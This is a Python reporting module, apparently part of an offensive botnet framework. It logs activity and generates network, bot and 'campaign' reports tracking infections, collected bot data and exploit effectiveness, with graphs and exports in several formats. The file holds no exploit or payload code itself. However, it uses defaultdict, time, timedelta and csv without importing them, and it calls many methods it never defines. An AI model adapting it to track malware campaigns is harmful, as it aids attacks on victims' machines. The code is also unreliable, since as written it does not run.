import os
import json
from datetime import datetime
import matplotlib.pyplot as plt
import networkx as nx
from typing import Dict, List
import pandas as pd

class Reporter:
    def __init__(self):
        self.report_dir = "reports"
        self.log_dir = os.path.join(self.report_dir, "logs")
        self.stats_dir = os.path.join(self.report_dir, "stats")
        self.custom_dir = os.path.join(self.report_dir, "custom")
        
        # Create directories
        for dir_path in [self.report_dir, self.log_dir, self.stats_dir, self.custom_dir]:
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)
        
        # Activity logging
        self.activity_log = []
        self.max_log_size = 10000  # Maximum number of log entries
        self.log_rotation_size = 1000000  # 1MB
        
        # Statistics tracking
        self.success_stats = defaultdict(lambda: {'success': 0, 'total': 0})
        self.resource_stats = defaultdict(list)  # host -> list of resource measurements
        self.traffic_stats = defaultdict(list)  # interface -> list of traffic measurements
        
        # Custom report templates
        self.report_templates = {}
        self.load_report_templates()
            
    def load_report_templates(self):
        """Load custom report templates"""
        template_file = os.path.join(self.custom_dir, "templates.json")
        if os.path.exists(template_file):
            with open(template_file, 'r') as f:
                self.report_templates = json.load(f)

    # Activity Logging
    def log_activity(self, activity_type: str, details: Dict, source: str):
        """Log an activity with details"""
        timestamp = datetime.now()
        log_entry = {
            'timestamp': timestamp.isoformat(),
            'type': activity_type,
            'source': source,
            'details': details
        }
        
        # Add to memory buffer
        self.activity_log.append(log_entry)
        if len(self.activity_log) > self.max_log_size:
            self._rotate_logs()
            
        # Write to log file
        log_file = os.path.join(self.log_dir, f"{timestamp.strftime('%Y%m%d')}.log")
        with open(log_file, 'a') as f:
            json.dump(log_entry, f)
            f.write('\n')

    def _rotate_logs(self):
        """Rotate logs when they get too large"""
        self.activity_log = self.activity_log[-self.max_log_size:]
        
        # Check log files
        for log_file in os.listdir(self.log_dir):
            file_path = os.path.join(self.log_dir, log_file)
            if os.path.getsize(file_path) > self.log_rotation_size:
                # Archive old log
                archive_name = f"{log_file}.{int(time.time())}.gz"
                import gzip
                with open(file_path, 'rb') as f_in:
                    with gzip.open(os.path.join(self.log_dir, archive_name), 'wb') as f_out:
                        f_out.writelines(f_in)
                os.remove(file_path)

    def query_logs(self, start_time: datetime = None, end_time: datetime = None,
                  activity_type: str = None, source: str = None) -> List[Dict]:
        """Query logs with filters"""
        results = []
        
        # Filter in-memory logs
        for entry in self.activity_log:
            if self._matches_filters(entry, start_time, end_time, activity_type, source):
                results.append(entry)
                
        # Check log files if needed
        if start_time and start_time < datetime.now() - timedelta(days=1):
            results.extend(self._query_log_files(start_time, end_time, activity_type, source))
            
        return results

    def _matches_filters(self, entry: Dict, start_time: datetime, end_time: datetime,
                        activity_type: str, source: str) -> bool:
        """Check if log entry matches filters"""
        entry_time = datetime.fromisoformat(entry['timestamp'])
        
        if start_time and entry_time < start_time:
            return False
        if end_time and entry_time > end_time:
            return False
        if activity_type and entry['type'] != activity_type:
            return False
        if source and entry['source'] != source:
            return False
            
        return True

    # Success Rate Analytics
    def record_operation(self, operation: str, success: bool):
        """Record operation success/failure"""
        stats = self.success_stats[operation]
        stats['total'] += 1
        if success:
            stats['success'] += 1

    def get_success_rate(self, operation: str = None) -> Dict:
        """Get success rate statistics"""
        if operation:
            stats = self.success_stats[operation]
            return {
                'operation': operation,
                'success_rate': stats['success'] / stats['total'] if stats['total'] > 0 else 0,
                'total_operations': stats['total'],
                'successful_operations': stats['success']
            }
        else:
            return {
                op: {
                    'success_rate': stats['success'] / stats['total'] if stats['total'] > 0 else 0,
                    'total_operations': stats['total'],
                    'successful_operations': stats['success']
                }
                for op, stats in self.success_stats.items()
            }

    # Resource Usage Statistics
    def record_resource_usage(self, host: str, metrics: Dict):
        """Record resource usage metrics"""
        timestamp = datetime.now()
        self.resource_stats[host].append({
            'timestamp': timestamp.isoformat(),
            **metrics
        })
        
        # Trim old data
        if len(self.resource_stats[host]) > 1000:
            self.resource_stats[host] = self.resource_stats[host][-1000:]

    def get_resource_usage(self, host: str, metric: str = None,
                         start_time: datetime = None, end_time: datetime = None) -> List[Dict]:
        """Get resource usage statistics"""
        stats = self.resource_stats[host]
        
        # Apply time filters
        if start_time or end_time:
            stats = [
                stat for stat in stats
                if (not start_time or datetime.fromisoformat(stat['timestamp']) >= start_time) and
                (not end_time or datetime.fromisoformat(stat['timestamp']) <= end_time)
            ]
            
        # Filter metric
        if metric:
            return [{
                'timestamp': stat['timestamp'],
                metric: stat[metric]
            } for stat in stats if metric in stat]
            
        return stats

    # Network Traffic Analysis
    def record_traffic(self, interface: str, metrics: Dict):
        """Record network traffic metrics"""
        timestamp = datetime.now()
        self.traffic_stats[interface].append({
            'timestamp': timestamp.isoformat(),
            **metrics
        })
        
        # Trim old data
        if len(self.traffic_stats[interface]) > 1000:
            self.traffic_stats[interface] = self.traffic_stats[interface][-1000:]

    def get_traffic_stats(self, interface: str = None,
                         start_time: datetime = None, end_time: datetime = None) -> Dict:
        """Get network traffic statistics"""
        if interface:
            stats = self.traffic_stats[interface]
            # Apply time filters
            if start_time or end_time:
                stats = [
                    stat for stat in stats
                    if (not start_time or datetime.fromisoformat(stat['timestamp']) >= start_time) and
                    (not end_time or datetime.fromisoformat(stat['timestamp']) <= end_time)
                ]
            return stats
        else:
            return {
                iface: self.get_traffic_stats(iface, start_time, end_time)
                for iface in self.traffic_stats
            }

    # Custom Report Generation
    def create_report_template(self, name: str, template: Dict):
        """Create a custom report template"""
        self.report_templates[name] = template
        self._save_templates()

    def delete_report_template(self, name: str):
        """Delete a report template"""
        if name in self.report_templates:
            del self.report_templates[name]
            self._save_templates()

    def generate_custom_report(self, template_name: str, data: Dict) -> str:
        """Generate a custom report using a template"""
        if template_name not in self.report_templates:
            raise ValueError(f"Template {template_name} not found")
            
        template = self.report_templates[template_name]
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Generate report based on template
        report = self._apply_template(template, data)
        
        # Save report
        filename = os.path.join(self.custom_dir, f"{template_name}_{timestamp}.json")
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
            
        return filename

    def _apply_template(self, template: Dict, data: Dict) -> Dict:
        """Apply a report template to data"""
        report = {}
        for key, value in template.items():
            if isinstance(value, dict):
                if '_source' in value:
                    # Extract data based on source
                    source = value['_source']
                    if source == 'logs':
                        report[key] = self.query_logs(**value.get('_filters', {}))
                    elif source == 'success_rate':
                        report[key] = self.get_success_rate(value.get('_operation'))
                    elif source == 'resources':
                        report[key] = self.get_resource_usage(**value.get('_filters', {}))
                    elif source == 'traffic':
                        report[key] = self.get_traffic_stats(**value.get('_filters', {}))
                else:
                    report[key] = self._apply_template(value, data)
            else:
                report[key] = value.format(**data) if isinstance(value, str) else value
        return report

    def _save_templates(self):
        """Save report templates to file"""
        template_file = os.path.join(self.custom_dir, "templates.json")
        with open(template_file, 'w') as f:
            json.dump(self.report_templates, f, indent=2)

    def generate_network_report(self, network_data: Dict):
        """Tạo báo cáo phân tích mạng"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report = {
                'timestamp': timestamp,
                'network_map': self._generate_network_map(network_data),
                'vulnerability_scan': self._analyze_vulnerabilities(network_data),
                'statistics': self._calculate_network_stats(network_data),
                'recommendations': self._generate_recommendations(network_data)
            }
            
            # Lưu báo cáo
            filename = os.path.join(self.report_dir, f"network_report_{timestamp}.json")
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
                
            # Tạo network graph
            self._generate_network_graph(network_data, timestamp)
            
            return filename
            
        except Exception as e:
            print(f"Error generating network report: {str(e)}")
            return None
            
    def generate_bot_report(self, bot_data: Dict):
        """Tạo báo cáo về bot"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report = {
                'timestamp': timestamp,
                'bot_info': self._analyze_bot_info(bot_data),
                'activity_timeline': self._generate_timeline(bot_data),
                'collected_data': self._analyze_collected_data(bot_data),
                'recommendations': self._generate_bot_recommendations(bot_data)
            }
            
            # Lưu báo cáo
            filename = os.path.join(self.report_dir, f"bot_report_{timestamp}.json")
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
                
            # Tạo activity graph
            self._generate_activity_graph(bot_data, timestamp)
            
            return filename
            
        except Exception as e:
            print(f"Error generating bot report: {str(e)}")
            return None
            
    def generate_campaign_report(self, campaign_data: Dict):
        """Tạo báo cáo chiến dịch"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report = {
                'timestamp': timestamp,
                'campaign_overview': self._analyze_campaign(campaign_data),
                'infection_stats': self._analyze_infections(campaign_data),
                'exploit_effectiveness': self._analyze_exploits(campaign_data),
                'recommendations': self._generate_campaign_recommendations(campaign_data)
            }
            
            # Lưu báo cáo
            filename = os.path.join(self.report_dir, f"campaign_report_{timestamp}.json")
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
                
            # Tạo infection graph
            self._generate_infection_graph(campaign_data, timestamp)
            
            return filename
            
        except Exception as e:
            print(f"Error generating campaign report: {str(e)}")
            return None
            
    def _generate_network_map(self, data: Dict) -> Dict:
        """Tạo network map từ dữ liệu"""
        network_map = {
            'nodes': [],
            'connections': [],
            'subnets': []
        }
        
        # Phân tích nodes
        for node in data.get('nodes', []):
            network_map['nodes'].append({
                'ip': node['ip'],
                'type': node.get('type', 'unknown'),
                'os': node.get('os', 'unknown'),
                'services': node.get('services', []),
                'vulnerabilities': node.get('vulnerabilities', [])
            })
            
        # Phân tích connections
        for conn in data.get('connections', []):
            network_map['connections'].append({
                'source': conn['source'],
                'target': conn['target'],
                'protocol': conn.get('protocol', 'unknown'),
                'ports': conn.get('ports', [])
            })
            
        # Phân tích subnets
        for subnet in data.get('subnets', []):
            network_map['subnets'].append({
                'network': subnet['network'],
                'mask': subnet['mask'],
                'gateway': subnet.get('gateway'),
                'dns': subnet.get('dns', [])
            })
            
        return network_map
        
    def _analyze_vulnerabilities(self, data: Dict) -> Dict:
        """Phân tích lỗ hổng"""
        vuln_analysis = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': []
        }
        
        for node in data.get('nodes', []):
            for vuln in node.get('vulnerabilities', []):
                severity = vuln.get('severity', 'low')
                vuln_analysis[severity].append({
                    'host': node['ip'],
                    'vulnerability': vuln['name'],
                    'details': vuln.get('details', ''),
                    'cve': vuln.get('cve', ''),
                    'exploit': vuln.get('exploit_available', False)
                })
                
        return vuln_analysis
        
    def _calculate_network_stats(self, data: Dict) -> Dict:
        """Tính toán thống kê mạng"""
        return {
            'total_hosts': len(data.get('nodes', [])),
            'total_connections': len(data.get('connections', [])),
            'os_distribution': self._count_os_distribution(data),
            'service_distribution': self._count_services(data),
            'vulnerability_summary': self._count_vulnerabilities(data)
        }
        
    def _generate_network_graph(self, data: Dict, timestamp: str):
        """Tạo network graph"""
        G = nx.Graph()
        
        # Thêm nodes
        for node in data.get('nodes', []):
            G.add_node(node['ip'], **node)
            
        # Thêm edges
        for conn in data.get('connections', []):
            G.add_edge(conn['source'], conn['target'])
            
        # Vẽ graph
        plt.figure(figsize=(12, 8))
        pos = nx.spring_layout(G)
        nx.draw(
            G, pos,
            with_labels=True,
            node_color='lightblue',
            node_size=500,
            font_size=8
        )
        
        # Lưu graph
        filename = os.path.join(self.report_dir, f"network_graph_{timestamp}.png")
        plt.savefig(filename)
        plt.close()
        
    def _generate_activity_graph(self, data: Dict, timestamp: str):
        """Tạo activity graph"""
        activities = pd.DataFrame(data.get('activities', []))
        
        if not activities.empty:
            plt.figure(figsize=(12, 6))
            activities['timestamp'] = pd.to_datetime(activities['timestamp'])
            activities.set_index('timestamp')['type'].value_counts().plot(kind='bar')
            plt.title('Bot Activity Distribution')
            plt.xlabel('Activity Type')
            plt.ylabel('Count')
            
            filename = os.path.join(self.report_dir, f"activity_graph_{timestamp}.png") 
            plt.savefig(filename)
            plt.close()
            
    def _generate_infection_graph(self, data: Dict, timestamp: str):
        """Tạo infection graph"""
        infections = pd.DataFrame(data.get('infections', []))
        
        if not infections.empty:
            plt.figure(figsize=(12, 6))
            infections['timestamp'] = pd.to_datetime(infections['timestamp'])
            infections.set_index('timestamp')['count'].plot()
            plt.title('Infection Growth Over Time')
            plt.xlabel('Time')
            plt.ylabel('Total Infections')
            
            filename = os.path.join(self.report_dir, f"infection_graph_{timestamp}.png")
            plt.savefig(filename)
            plt.close()
            
    # Export Functionality
    def export_report(self, report_data: Dict, format: str = 'json', template: str = None) -> str:
        """Export report in different formats"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if template:
            report_data = self._apply_template(self.report_templates[template], report_data)
            
        if format == 'json':
            return self._export_json(report_data, timestamp)
        elif format == 'pdf':
            return self._export_pdf(report_data, timestamp)
        elif format == 'html':
            return self._export_html(report_data, timestamp)
        elif format == 'csv':
            return self._export_csv(report_data, timestamp)
        else:
            raise ValueError(f"Unsupported format: {format}")

    def _export_json(self, data: Dict, timestamp: str) -> str:
        """Export report as JSON"""
        filename = os.path.join(self.report_dir, f"report_{timestamp}.json")
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        return filename

    def _export_pdf(self, data: Dict, timestamp: str) -> str:
        """Export report as PDF"""
        from reportlab.lib import colors
        from reportlab.lib.pagesizes import letter
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle

        filename = os.path.join(self.report_dir, f"report_{timestamp}.pdf")
        doc = SimpleDocTemplate(filename, pagesize=letter)
        styles = getSampleStyleSheet()
        story = []

        # Add title
        story.append(Paragraph("Detailed Report", styles['Title']))
        story.append(Spacer(1, 12))

        # Add sections
        for section, content in data.items():
            story.append(Paragraph(section.title(), styles['Heading1']))
            story.append(Spacer(1, 12))

            if isinstance(content, list):
                # Create table for list data
                if content and isinstance(content[0], dict):
                    headers = list(content[0].keys())
                    table_data = [headers]
                    for item in content:
                        table_data.append([str(item.get(h, '')) for h in headers])
                    t = Table(table_data)
                    t.setStyle(TableStyle([
                        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                        ('GRID', (0, 0), (-1, -1), 1, colors.black),
                        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ]))
                    story.append(t)
                else:
                    for item in content:
                        story.append(Paragraph(str(item), styles['Normal']))
            elif isinstance(content, dict):
                # Create table for dict data
                table_data = [[k, str(v)] for k, v in content.items()]
                t = Table(table_data)
                t.setStyle(TableStyle([
                    ('GRID', (0, 0), (-1, -1), 1, colors.black),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ]))
                story.append(t)
            else:
                story.append(Paragraph(str(content), styles['Normal']))
            story.append(Spacer(1, 12))

        doc.build(story)
        return filename

    def _export_html(self, data: Dict, timestamp: str) -> str:
        """Export report as HTML"""
        filename = os.path.join(self.report_dir, f"report_{timestamp}.html")
        
        def dict_to_html(d, level=0):
            html = ""
            indent = "  " * level
            if isinstance(d, dict):
                html += f"{indent}<dl>\n"
                for k, v in d.items():
                    html += f"{indent}  <dt>{k}</dt>\n"
                    html += f"{indent}  <dd>{dict_to_html(v, level+1)}</dd>\n"
                html += f"{indent}</dl>\n"
            elif isinstance(d, list):
                html += f"{indent}<ul>\n"
                for item in d:
                    html += f"{indent}  <li>{dict_to_html(item, level+1)}</li>\n"
                html += f"{indent}</ul>\n"
            else:
                html += str(d)
            return html

        template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Report {timestamp}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                h1 {{ color: #333; }}
                dl {{ margin-left: 20px; }}
                dt {{ font-weight: bold; margin-top: 10px; }}
                dd {{ margin-left: 20px; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f5f5f5; }}
            </style>
        </head>
        <body>
            <h1>Report {timestamp}</h1>
            {content}
        </body>
        </html>
        """

        with open(filename, 'w') as f:
            f.write(template.format(
                timestamp=timestamp,
                content=dict_to_html(data)
            ))
        return filename

    def _export_csv(self, data: Dict, timestamp: str) -> str:
        """Export report as CSV"""
        filename = os.path.join(self.report_dir, f"report_{timestamp}.csv")
        
        def flatten_dict(d, parent_key='', sep='_'):
            items = []
            for k, v in d.items():
                new_key = f"{parent_key}{sep}{k}" if parent_key else k
                if isinstance(v, dict):
                    items.extend(flatten_dict(v, new_key, sep=sep).items())
                else:
                    items.append((new_key, v))
            return dict(items)

        # Flatten nested structures
        flat_data = flatten_dict(data)
        
        with open(filename, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Key', 'Value'])
            for key, value in flat_data.items():
                if isinstance(value, list):
                    writer.writerow([key, json.dumps(value)])
                else:
                    writer.writerow([key, value])
                    
        return filename